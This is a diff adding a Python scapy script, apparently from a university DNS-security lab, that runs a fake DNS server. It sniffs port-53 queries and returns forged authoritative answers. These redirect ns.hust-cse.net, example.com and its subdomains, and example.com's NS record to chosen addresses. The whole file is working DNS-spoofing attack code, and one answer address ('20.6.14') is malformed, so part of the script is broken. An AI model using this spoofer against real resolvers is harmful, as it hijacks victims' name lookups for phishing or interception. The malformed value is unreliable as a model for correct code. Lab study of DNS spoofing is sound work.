@@ -1,0 +1,55 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import time
+
+def dns_handler(pkt):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode()
+        print(f"[*] Received DNS query for {qname} from {pkt[IP].src}")
+        
+        # 处理 ns.hust-cse.net 查询
+        if 'ns.hust-cse.net' in qname:
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                   UDP(dport=pkt[UDP].sport, sport=53) / \
+                   DNS(id=pkt[DNS].id, qr=1, aa=1, 
+                       qd=pkt[DNS].qd,
+                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='10.10.27.4'))
+            send(resp, verbose=0)
+            print(f"[+] Responded: ns.hust-cse.net -> 10.10.27.4")
+
+        # 处理 example.com A记录查询
+        elif 'example.com' in qname and pkt[DNSQR].qtype == 1:
+            # 根域名 example.com
+            if qname.strip('.') == 'example.com':
+                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                       UDP(dport=pkt[UDP].sport, sport=53) / \
+                       DNS(id=pkt[DNS].id, qr=1, aa=1,
+                           qd=pkt[DNS].qd,
+                           an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.6.14'))
+                send(resp, verbose=0)
+                print(f"[+] Responded: example.com -> 20.6.14")
+            
+            # 子域名 *.example.com
+            else:
+                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                       UDP(dport=pkt[UDP].sport, sport=53) / \
+                       DNS(id=pkt[DNS].id, qr=1, aa=1,
+                           qd=pkt[DNS].qd,
+                           an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.23.3.19'))
+                send(resp, verbose=0)
+                print(f"[+] Responded: {qname} -> 20.23.3.19")
+
+        # 处理 example.com NS记录查询
+        elif 'example.com' in qname and pkt[DNSQR].qtype == 2:
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                   UDP(dport=pkt[UDP].sport, sport=53) / \
+                   DNS(id=pkt[DNS].id, qr=1, aa=1,
+                       qd=pkt[DNS].qd,
+                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, type='NS', rdata='ns.hust-cse.net'),
+                       ar=DNSRR(rrname='ns.hust-cse.net', ttl=600, rdata='10.10.27.4'))
+            send(resp, verbose=0)
+            print(f"[+] Responded: example.com NS -> ns.hust-cse.net")
+
+print("[*] Starting fake DNS server on 10.10.27.4:53...")
+print("[*] Ready to handle DNS queries...")
+sniff(filter="udp port 53 and host 10.10.27.4", prn=dns_handler, store=0)
